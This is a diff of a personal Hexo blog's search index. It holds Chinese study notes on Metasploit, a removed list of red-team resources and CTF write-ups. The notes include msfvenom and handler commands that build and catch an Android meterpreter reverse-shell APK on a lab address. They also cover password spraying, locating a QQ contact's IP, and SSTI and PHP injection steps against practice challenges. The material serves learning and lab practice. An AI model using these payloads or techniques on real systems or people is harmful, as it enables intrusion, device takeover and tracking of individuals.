@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Genshin</title>
+    <url>/2022/09/01/Genshin/</url>
+    <content><![CDATA[<center>woc，原</center>
+
+<span id="more"></span>
+
+<h2 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h2><p><a href="https://wiki.biligame.com/ys/%E9%A6%96%E9%A1%B5">原神WIKI</a></p>
+<p><a href="https://ambr.top/chs">Project Amber</a></p>
+<p><a href="https://genshin.honeyhunterworld.com/?lang=CHS">Honey Impact - Genshin Impact Database</a></p>
+<h2 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h2><p><a href="https://webstatic.mihoyo.com/app/ys-map-cn/index.html?bbs_presentation_style=no_header&ts=1606133548270#/map/2?shown_types=&center=1877.00,1300.00&zoom=-4.00">提瓦特大地图 - 观测枢</a></p>
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p><a href="https://genshin.mingyulab.com/">原魔计算器</a></p>
+<p><a href="https://bbs.nga.cn/read.php?tid=28172053&rand=430">圣遗物扫描工具 ‘天目’</a></p>
+]]></content>
+      <tags>
+        <tag>fun</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux/kali/docker</title>
     <url>/2022/08/31/Linux-kali-docker/</url>
     <content><![CDATA[<center>Linux/kali/docker环境部署/使用/问题</center>
@@ -61,22 +79,40 @@
       </tags>
   </entry>
   <entry>
-    <title>Genshin</title>
-    <url>/2022/09/01/Genshin/</url>
-    <content><![CDATA[<center>woc，原</center>
+    <title>Metaspolt</title>
+    <url>/2022/08/30/Metaspolt/</url>
+    <content><![CDATA[<center>Metasploit</center>
 
 <span id="more"></span>
 
-<h2 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h2><p><a href="https://wiki.biligame.com/ys/%E9%A6%96%E9%A1%B5">原神WIKI</a></p>
-<p><a href="https://ambr.top/chs">Project Amber</a></p>
-<p><a href="https://genshin.honeyhunterworld.com/?lang=CHS">Honey Impact - Genshin Impact Database</a></p>
-<h2 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h2><p><a href="https://webstatic.mihoyo.com/app/ys-map-cn/index.html?bbs_presentation_style=no_header&ts=1606133548270#/map/2?shown_types=&center=1877.00,1300.00&zoom=-4.00">提瓦特大地图 - 观测枢</a></p>
-<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p><a href="https://genshin.mingyulab.com/">原魔计算器</a></p>
-<p><a href="https://bbs.nga.cn/read.php?tid=28172053&rand=430">圣遗物扫描工具 ‘天目’</a></p>
+<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p><a href="https://blog.51cto.com/u_15346415/5171938">android</a><br>端口映射<br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
+<p>sudo apt install zipalign</p>
+<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 2048  -validity 10000 </p>
+<p>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name<br><a href="https://blog.csdn.net/ming6365630/article/details/73088577/">private key algorithm is not c ompatible with signat</a><br><a href="https://blog.csdn.net/AinUser/article/details/107364987">The security strength of SHA-1 digest algorithm is not sufficient for this key size</a></p>
+<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 1024  -validity 10000<br>jarsigner -verbose -sigalg SHA1withDSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name</p>
+<p>jarsigner -verify -verbose -certs shell.apk</p>
+<p>use exploit&#x2F;multi&#x2F;handler<br>set payload android&#x2F;meterpreter&#x2F;reverse_tcp<br>set lhost 192.168.241.131<br>set lport 9999</p>
+<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://blog.csdn.net/QQ670663/article/details/122986061">Kali使用Metasploit内、外网渗透windows系统</a><br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
 ]]></content>
       <tags>
-        <tag>fun</tag>
+        <tag>study</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/08/30/hello-world/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="3fbf53f127f9724098f1685893429b30cd0981d9136b5965b537eb10218c09c3">165d50f05814027fb7fe5e4ae8a088d83a3c45e1f62d098feb303294e4ed6e4f25c65523774c3d6ea870bc5736ab28c0c9d794c41287fea5c81920506ddf2623ce7f92c59285f1791066d6d5cedb691ed56b6cfd48a4d8aee54788f02cd7988ff0a5e44165a0d41640c586e68e587f72282fef9f4334df3f5c52c28b0e47bb5a872cdcf183526aefffaa49fd2b83f3fc9e38be672677af6778a9ccf7dcc5da2d4db1f6b31a6c80bf842cab813b239cad1622475c59655a171d83c059b9da884fa4e1815bcba998ca242b8ef1ab2744f1a66cd2f370e099e1ee3b8875a2d30e40122dcaba723ca2fb973019f1ca39197381a0bcf661d35835a1e002e529a08addd1877d1b22e23b3d5ce23f2ab807bfdf45111fb1dd1c1b71ccad2c0f655929d566e83b9526db4dbf046de778ae74b15755372a95a241a820d6fcdca835f7cfd54cd5db7f84bfe627a613be8bd99c7627d1869606eddf538097e27d7c35fb31bd26842e2a40ef31457feffce2ee0298f59bbd668ac3c0630ada2e31b5e6e17cdfe56aedb2d08284dd8442652567a266d52272469129de37c0a022e61dfcc52702fcaa7277c824c7e9db5b01d45f02ca9b135778b50b0bfde509cc7ec807d089ab3d79a261493a795985b3aeb99cfffcdd4df27ffe10f036430be74b38cf8736dc01a7bd825903217ec8dd39410177bbd18fd0465383f852320694a7f5cdf71d4c1e09b3d9c851cb81f494eee6baecd526e554e609f66eebfa1128435108ecf9b1f6a6cbd6bec3e126cc4d7413390426bfe99e79cf1ca31dc32bca2b638f48b34d428b9901291050be054092daa42b79f58ace5f776b46d4050316df3b4fb494071d3a99b203512f6a90dd1bd570050514a1bc91d1e47adcca47475c423c661ea142498328a7a396a54eb2fa3c5b812bb70c57558f1457ab3b2657b8e232c20ed64e699a70585de813988aefa6e129b3f55fff0b00f0e4f767fa735082a838efbf6617a4d16f0737543a7c6b3332b7f6c355a864ec7378e36d0afdf3ecc9e765dea86e68f212cf5b1e6bd7b5b5a317ed33cabc9ed4f7e7813402f156f5b124d10551df5d83e1c8e9e14d4e6e3f05d4a37b6d169995c11f87edd2341007f7442814cd1cf0fe871cc6f20205ed8c3657eb24eb400a0f53bc40ba142429320bbb6735382c29dc8d676d0e51a435ebd839a7ec22dede032d856365d1ffaf3a6d131bd04ff2a0f89c8aad0b3844ec2c57866adcfd4799e37407a5f1951071edaad14517f586d8efb3be3dd8629d2349cb96195dbaba39a4044d2955fbe2b8a94e1a4dcf5c887eff8dc6ac33fe5696284c1a3ecc977ec4dcba77add868d19985740505cd8b1fa1a417323076be25f37f5f2438c72bf2914f91e4592e36eae0125580583737bb1b2bd40b30f2ac2651d2bb5984e5b4646fb2141cf549e362430e9013bfc9bdc236beb7e2f77735816a75135adf23f2b6b010c4e270e0fe3679a84d2228c857e53f0d90c83e84d13e3cdbcd865128c56d7dbfe9c76f6a4539adaff73aabeb8475435b03a78d5029953c971ca6cbbf8a1df5a241a6c497cf0c987e336f49fee04fb2e752350399c01d7a1ecf778d80236af519fc6c55273b8a6e73f281e95f7921603499f43231d001703206dd1e9572491f1525cc81a7e7c1604a862cd32f59baccadbaa3cf6d82efae304b34cbc3064dbee3eecd52d18c4c5d0a87a015c0eea0a011599df9e4ebf0f1566555f869f759d2469ccaf392fbb08f6b711aecf59cb00e6941c9404d1957552f6054b7ef4de505c555ddbedf7512c0f019f16aaa9ffacf09de51c6127bae45299a33f6382d50f28fd4b776bf2e56d4423d9b9ce1038587bc210da79a2932572f937ca149bd6f5c4fc4f3c2264cc7b1616c1efc912d3d737c5c9bbd3a21e51b4f09fa1f0a7e52989d5ca8582978f25046495f571a69c16a2bd2d3f9f25e6d5d067e040224bb5e20e5a669ca00d49dd99355566c9f1871f7ef7c4ddf4535d0a7a1311d3d84bbd7fc65aa6d2d161672987e7a21b8381ae160026ccafcdac757931bdb27739a69e3c964328334995bcfdd5d7d8fae15d9e3d870611e8be36b3d62417c617a9fb2102422968a536d14677ed1768cdfa95a226270025663299478f2c2afcfe1a18e36946db6122f5aa8fa163085623562a3fb451d4d0abb8cd151d7be212d73d6d5db72ac4560468f4793ac476a2eb2ee19f5e8a3c6b6eeac74394e62693e741e5f018d2ee9c72dc84447d43dcf5523e517fc4485e48962a111da629db5c7103852c98728b7d68ebc064a5c59e5f59154497ec495b8e72f1c7972a00c5897971e7463572a1542f456fd7449b757d7cec20c70d4183f4794826ed8bb39413713dd44fdced93e7e84084bc4f297d7b3e2e5c2ae378afbd71aac3f7ade48f1fa3c1aae001a5a7a65fb247cd6d3167a0ba65d224a32836882664b57727d692b2a469610c4727ea89a5b952066545adc60a09161419201779766389aa0ae0bcaf4e41f0770876a169fe3a3aa52819c7c464616b58dbfbb363c2878c7b162c3a5f7b8e3db9bbb8e021a9af8463853b0abd6deeba6a5bc8adedc1e47d9eed3dc20110ab823fd2685067c34d6cb3db4d871ed3b0a904bafb4a482cec76a8bea9cc87a6374ba83709294c38870cb329182fe0930257f2034b8f259483b420d14836c5dc8159f065b7c2c517b344b624b48a4e2cfdddc46713cc91ea821f93370080d1140345c36b00aed50b89595dfe2655869053590f8469528412ef1308e8084333c69178d5d9ad290204b9ecad6ced99f2a170b13d067523628ce98a464aa0e4d8ef43202cfc50d8c830cd74800b1ca4ab75c2f710a6b8431cb21af49bf95db7fee5fa4818ad7866fa9f90476bb7c897ea0ce5ef2fceffa53ab46257e6baa5816154149e5180bded67e886bc4e31c36f3fceb5f731d6b04cd5692134497284b76225c3c899e1bcd66aa3b86982068c058c084e289ff610badfd5a62e3fccb256670955b71e0db5d5f75fefc5ddec6307a4ac955e160a5b39384b38daca1a44bc99002bee1270c899a1a8c1e2f552ff834efeb151506fd3951d7635cb746cb40afe5cd7b824abb96ea024664f6a3e7110302c5692ecbbf7219884013eee34c1079a4b5d62fd0065e3ed6824392f0f8267edf8840fe1432314f267dc6eb7b300261f576c14ac6aab9ef8909f0d9eba86dcbcbc9fe</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
     <title>DVWA</title>
@@ -1053,68 +1089,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hvv</title>
-    <url>/2022/09/15/hvv/</url>
-    <content><![CDATA[<p>微步</p>
-<span id="more"></span>
-
-<h2 id="情报平台"><a href="#情报平台" class="headerlink" title="情报平台"></a>情报平台</h2><p><a href="https://x.threatbook.com/">微步</a></p>
-<h2 id="HW重保之最强战神"><a href="#HW重保之最强战神" class="headerlink" title="HW重保之最强战神"></a>HW重保之最强战神</h2><p><a href="https://x.threatbook.com/v5/article?threatInfoID=11732">1</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11770">2</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11792">3</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11823">4</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11829">5</a></p>
-<p><img data-src="https://img.threatbook.com/d4484fb07ad1f6032cea3cb9c8563f18df4dfb87eebc54ab451e658290c00776.jpg" alt="img"></p>
-<p><img data-src="https://img.threatbook.com/f27b57cb15ff2495e045e8cf9381961f4852a29d96cefd28f5df7a859e1ec05f.jpg" alt="img"></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11897">6</a></p>
-<p><img data-src="https://img.threatbook.com/22c1ebebd60772286b4859751e3683f13f38856b1458945a20a634c25e7ae745.png" alt="img"></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12014">7</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12157">8</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12496">9</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=18563">10</a></p>
-<h2 id="重生之我是赏金猎人"><a href="#重生之我是赏金猎人" class="headerlink" title="重生之我是赏金猎人"></a>重生之我是赏金猎人</h2><p><a href="https://github.com/J0o1ey/BountyHunterInChina">https://github.com/J0o1ey/BountyHunterInChina</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=13282">1</a></p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>代理池<a href="https://luminati-china.biz/">Luminati</a></p>
-<p><a href="https://market.aliyun.com/products/56956004">阿里云市场API</a></p>
-<p>Wireshark抓取QQ好友ip:020048是QQ电话的网络数据包中的关键词，通过打QQ电话，可以轻松抓取IP信息。</p>
-<p><a href="https://www.openstego.com/">OpenStego隐写工具</a></p>
-<p><a href="http://t.zoukankan.com/zlgxzswjy-p-6678081.html">NTFS文件流文件寄生</a></p>
-<p><a href="https://blog.csdn.net/wxh0000mm/article/details/121204656">autorun.inf</a></p>
-<p><a href="https://blog.csdn.net/qq_57307348/article/details/122904162">access注入</a></p>
-<p>amass子域名搜集工具</p>
-<p><strong>密码喷洒</strong>：在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是先用一个密码去碰撞很多账号，此方法能有效的避免账号被锁定的问题</p>
-<p>获取了域用户后，进行密码喷洒</p>
-<p><a href="https://www.cnblogs.com/nongchaoer/p/16497098.html">内存马</a></p>
-<p><a href="https://hfish.io/#/">蜜罐HFish</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12125">github免杀项目</a></p>
-<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11706">红队打点</a></p>
-]]></content>
-      <tags>
-        <tag>fun</tag>
-        <tag>study</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metaspolt</title>
-    <url>/2022/08/30/Metaspolt/</url>
-    <content><![CDATA[<center>Metasploit</center>
-
-<span id="more"></span>
-
-<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p><a href="https://blog.51cto.com/u_15346415/5171938">android</a><br>端口映射<br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
-<p>sudo apt install zipalign</p>
-<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 2048  -validity 10000 </p>
-<p>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name<br><a href="https://blog.csdn.net/ming6365630/article/details/73088577/">private key algorithm is not c ompatible with signat</a><br><a href="https://blog.csdn.net/AinUser/article/details/107364987">The security strength of SHA-1 digest algorithm is not sufficient for this key size</a></p>
-<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 1024  -validity 10000<br>jarsigner -verbose -sigalg SHA1withDSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name</p>
-<p>jarsigner -verify -verbose -certs shell.apk</p>
-<p>use exploit&#x2F;multi&#x2F;handler<br>set payload android&#x2F;meterpreter&#x2F;reverse_tcp<br>set lhost 192.168.241.131<br>set lport 9999</p>
-<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://blog.csdn.net/QQ670663/article/details/122986061">Kali使用Metasploit内、外网渗透windows系统</a><br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
-]]></content>
-      <tags>
-        <tag>study</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WRITEUP</title>
     <url>/2022/08/30/WRITEUP/</url>
     <content><![CDATA[<center>CTF的Writeup</center>
@@ -1498,7 +1472,7 @@
 
 <p><img data-src="/../images/WRITEUP/image-20220919104700241.png" alt="image-20220919104700241"></p>
 <p><code>flag&#123;shrine_is_good_ssti&#125;</code></p>
-<h2 id="easytornado-x2F-护网杯-3"><a href="#easytornado-x2F-护网杯-3" class="headerlink" title="easytornado&#x2F;护网杯(3)"></a>easytornado&#x2F;护网杯(3)</h2><h2 id="unseping-x2F-江苏工匠杯-1"><a href="#unseping-x2F-江苏工匠杯-1" class="headerlink" title="unseping&#x2F;江苏工匠杯(1)"></a>unseping&#x2F;江苏工匠杯(1)</h2><p><a href="https://www.pudn.com/news/634a7fc12aaf6043c92a4a0a.html">参考</a></p>
+<h2 id="unseping-x2F-江苏工匠杯-1"><a href="#unseping-x2F-江苏工匠杯-1" class="headerlink" title="unseping&#x2F;江苏工匠杯(1)"></a>unseping&#x2F;江苏工匠杯(1)</h2><p><a href="https://www.pudn.com/news/634a7fc12aaf6043c92a4a0a.html">参考</a></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) <span class="comment">//过滤了 | &amp; ; space /</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>大致流程是：</p>
@@ -1572,6 +1546,73 @@
 
 <p>得到flag</p>
 <p><code>cyberpeace&#123;c994b9366b8a342a494047cedee1e812&#125;</code></p>
+<h2 id="easytornado-x2F-护网杯-3"><a href="#easytornado-x2F-护网杯-3" class="headerlink" title="easytornado&#x2F;护网杯(3)"></a>easytornado&#x2F;护网杯(3)</h2><p>在&#x2F;<code>flag.txt</code>提示flag在<code>/fllllllllllllag</code>中，且查看url可以发现传了两个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/hints.txt&amp;filehash=2598a04e7cc8a8a459f0679b95e33982</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/hint.txt</code>中可以看到hash值的计算方法是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>所以关键是找到<code>cookie_secret</code>值</p>
+<p>根据提示<code>Tornado框架</code>和<code>render</code>渲染函数，猜测需要利用模板注入漏洞来找到flag</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重定向到<code>http://61.147.171.105:53261/error?msg=Error</code>并提示Error</p>
+<p>可能存在服务端模板注入攻击 （SSTI），尝试在当前页面进行模板注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在模板注入</p>
+<p><img data-src="/../images/WRITEUP/image-20221109094634984.png" alt="image-20221109094634984"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，</span><br><span class="line">handler-&gt;RequestHandler</span><br><span class="line">RequestHandler.settings-&gt;self.application.settings</span><br><span class="line">所以handler.settings-&gt;RequestHandler.application.settings</span><br><span class="line">这里面是一些环境变量</span><br></pre></td></tr></table></figure>
+
+<p>结果出现了<code>cookie_secret</code>的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c01d81b4-935c-4f0c-b3e7-eecbee4544c2</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/WRITEUP/image-20221109095030350.png" alt="image-20221109095030350"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(cookie_secret+md5(&quot;/fllllllllllllag&quot;))</span><br><span class="line">a497d10f68a24eabcd104d2db8167ada</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=a497d10f68a24eabcd104d2db8167ada</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><code>flag&#123;3f39aea39db345769397ae895edb9c70&#125;</code></p>
+<h2 id="simple-js-x2F-root-me-3"><a href="#simple-js-x2F-root-me-3" class="headerlink" title="simple_js&#x2F;root-me(3)"></a>simple_js&#x2F;root-me(3)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function dechiffre(pass_enc)&#123;</span><br><span class="line">	var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;</span><br><span class="line">	var tab  = pass_enc.split(&#x27;,&#x27;);</span><br><span class="line">    var tab2 = pass.split(&#x27;,&#x27;);</span><br><span class="line">    var i,j,k,l=0,m,n,o,p = &quot;&quot;;</span><br><span class="line">    i = 0;</span><br><span class="line">    j = tab.length;</span><br><span class="line">    k = j + (l) + (n=0);</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    for(i = (o=0); i &lt; (k = j = n); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    	o = tab[i-l];</span><br><span class="line">    	p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    	if(i == 5) break;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = (o=0); i &lt; (k = j = n); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    	o = tab[i-l];</span><br><span class="line">    	if(i &gt; 5 &amp;&amp; i &lt; k-1)</span><br><span class="line">	    	p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    p += String.fromCharCode(tab2[17]);</span><br><span class="line">    pass = p;</span><br><span class="line">    return pass;</span><br><span class="line">&#125;</span><br><span class="line">String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));</span><br><span class="line"></span><br><span class="line"> h = window.prompt(&#x27;Enter password&#x27;);</span><br><span class="line"> alert( dechiffre(h) );</span><br></pre></td></tr></table></figure>
+
+<p><code>dechiffre</code>函数其实就是将十进制转成字符</p>
+<p>而想要获取的密码（flag）为下列结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这里需要将16进制转换成ascii后转成字符</p>
+<p><a href="http://ascii-converter.bchrt.com/">ascii、16进制、2进制、十进制、base64在线转换</a></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>结果是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">786OsErtk12</span><br></pre></td></tr></table></figure>
+
+<p>根据题目描述（<code>Flag格式为 Cyberpeace&#123;xxxxxxxxx&#125;</code>）得到flag</p>
+<p>这里我还以为需要再次输入弹出框才能得到flag( ╯□╰ )</p>
+<p><code>Cyberpeace&#123;786OsErtk12&#125;</code></p>
+<h2 id="mfw-x2F-csaw-3"><a href="#mfw-x2F-csaw-3" class="headerlink" title="mfw&#x2F;csaw(3)"></a>mfw&#x2F;csaw(3)</h2><p>在<code>about页</code>说使用了<code>git</code>，可能存在<code>git泄露</code></p>
+<p><img data-src="/../images/WRITEUP/image-20221109151630477.png" alt="image-20221109151630477"></p>
+<p>访问<code>/.git</code>发现确实存在</p>
+<p><img data-src="/../images/WRITEUP/image-20221109151712968.png" alt="image-20221109151712968"></p>
+<p>使用<code>githack</code>工具获取泄露的内容，可以看到template目录下存在<code>flag.php</code>，然而内容为空</p>
+<p><img data-src="/../images/WRITEUP/image-20221109151945741.png" alt="image-20221109151945741"></p>
+<p>在<code>index.php</code>中存在如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">	$page = $_GET[&#x27;page&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">// TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中assert()函数其实是一个断言函数。assert函数在php语言中是用来判断一个表达式是否成立。返回true or false;</span><br><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br><span class="line"></span><br><span class="line">strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到则返回flase，</span><br></pre></td></tr></table></figure>
+
+<p>因为并没有对输入进行过滤，可以构建语句闭合执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=&#x27;);//</span><br></pre></td></tr></table></figure>
+
